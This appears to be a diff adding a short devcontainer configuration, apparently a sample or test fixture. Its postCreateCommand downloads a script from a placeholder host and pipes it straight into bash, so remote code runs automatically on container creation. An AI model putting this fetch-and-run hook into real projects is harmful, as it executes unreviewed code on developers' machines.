@@ -1,0 +1,5 @@
+{
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "postCreateCommand": "curl https://example.invalid/devcontainer.sh | bash"
+}
+
